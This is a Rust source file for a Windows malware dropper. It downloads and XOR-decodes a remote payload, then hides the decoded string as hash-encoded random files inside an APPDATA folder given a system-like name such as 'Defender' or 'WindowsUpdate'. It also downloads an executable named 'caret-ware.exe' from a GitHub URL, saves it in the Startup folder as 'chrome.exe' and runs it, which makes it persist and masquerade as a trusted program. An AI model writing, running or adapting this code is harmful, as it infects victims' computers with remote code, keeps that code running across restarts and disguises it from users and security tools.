use base64::{engine::general_purpose, Engine as _};
use rand::Rng;
use std::error::Error;
use std::fs;
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process::Command;

const KEY: &[u8] = b"ETIN";
const DOWNLOAD_URL: &str = "https://github.com/luka-4evr/my-heart/raw/refs/heads/main/caret-ware.exe";
const MIN_FILE_SIZE: usize = 1024;
const MAX_FILE_SIZE: usize = 51200;

fn random_system_like_name() -> String {
    let choices = [
        "WindowsUpdate",
        "SystemCache",
        "AppDataCache",
        "Defender",
        "DriverStore",
        "WinSxS",
        "Diagnostics",
        "Telemetry",
        "WMI",
    ];
    let mut rng = rand::thread_rng();
    choices[rng.gen_range(0..choices.len())].to_string()
}


fn download_binary(dest: &Path) -> Result<(), Box<dyn Error>> {
    let resp = ureq::get(DOWNLOAD_URL).call()?;
    let mut reader = resp.into_reader();
    if let Some(parent) = dest.parent() {
        fs::create_dir_all(parent)?;
    }
    let mut file = fs::File::create(dest)?;
    io::copy(&mut reader, &mut file)?;
    Ok(())
}

fn execute_binary(path: &Path) -> std::io::Result<()> {
    Command::new(path).spawn()?;
    Ok(())
}

fn get_startup_path() -> Result<PathBuf, Box<dyn Error>> {
    let appdata = std::env::var("APPDATA")?;
    Ok(PathBuf::from(appdata)
        .join(r"Microsoft\Windows\Start Menu\Programs\Startup"))
}

fn get_random_appdata_path() -> Result<PathBuf, Box<dyn Error>> {
    let appdata = std::env::var("APPDATA")?;
    Ok(PathBuf::from(appdata).join(random_system_like_name()))
}

fn generate_random_filename(length: usize) -> String {
    let mut rng = rand::thread_rng();
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    (0..length)
        .map(|_| {
            let idx = rng.gen_range(0..CHARS.len());
            CHARS[idx] as char
        })
        .collect()
}

fn calculate_hash(data: &[u8]) -> u32 {
    let mut hash: u32 = 0xbaadf00d;

    for &byte in data {
        hash ^= byte as u32;
        hash = hash.wrapping_mul(0x9e3779b1);
        hash ^= hash >> 16;
        hash = hash.wrapping_mul(0x85ebca77);
        hash ^= hash >> 13;
    }

    hash & 0xFFFFFF
}

fn byte_to_base4(byte: u8) -> Vec<u8> {
    let mut result = Vec::new();
    let mut value = byte;
    for _ in 0..4 {
        result.push(value % 4);
        value /= 4;
    }
    result.reverse();
    result
}

fn get_pool_range(pool: u8) -> (u32, u32) {
    let pool_size = 0x1000000 / 4;
    let start = pool as u32 * pool_size;
    let end = start + pool_size - 1;
    (start, end)
}

fn generate_file_with_hash_in_pool(pool: u8) -> Vec<u8> {
    let (start, end) = get_pool_range(pool);
    let mut rng = rand::thread_rng();
    const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    loop {
        let file_size = rng.gen_range(MIN_FILE_SIZE..=MAX_FILE_SIZE);
        let data: Vec<u8> = (0..file_size)
            .map(|_| {
                let idx = rng.gen_range(0..CHARS.len());
                CHARS[idx]
            })
            .collect();
        let hash = calculate_hash(&data);

        if hash >= start && hash <= end {
            return data;
        }
    }
}

fn encode_string(input: &str, output_dir: &str) -> std::io::Result<()> {
    if Path::new(output_dir).exists() {
        fs::remove_dir_all(output_dir)?;
    }
    fs::create_dir_all(output_dir)?;

    for (idx, byte) in input.bytes().enumerate() {
        let base4_parts = byte_to_base4(byte);
        let folder_name = format!("{:03}_{}", idx, generate_random_filename(8));
        let folder_path = format!("{}/{}", output_dir, folder_name);
        fs::create_dir_all(&folder_path)?;

        for (sub_idx, &pool) in base4_parts.iter().enumerate() {
            let file_name = format!("{}_{}.bin", sub_idx, generate_random_filename(12));
            let file_path = format!("{}/{}", folder_path, file_name);
            let file_data = generate_file_with_hash_in_pool(pool);

            let mut file = fs::File::create(&file_path)?;
            file.write_all(&file_data)?;
        }
    }

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let url = "https://github.com/luka-4evr/my-saviour/raw/refs/heads/main/part2.txt";
    let input_string = ureq::get(url)
        .call()?
        .into_string()?;
    let mut decoded = general_purpose::STANDARD
        .decode(input_string.trim())
        .expect("Failed to base64 decode");
    for (i, byte) in decoded.iter_mut().enumerate() {
        *byte ^= KEY[i % KEY.len()];
    }
    let decoded_string = String::from_utf8(decoded).expect("Decoded data not UTF-8");
    let output_dir = get_random_appdata_path()?;

    encode_string(&decoded_string, &output_dir.to_string_lossy())?;

    let startup_dir = get_startup_path()?;
    if !startup_dir.exists() {
        fs::create_dir_all(&startup_dir)?;
    }

    let startup_path = startup_dir.join("chrome.exe");
    download_binary(&startup_path)?;
    execute_binary(&startup_path)?;
    Ok(())
}

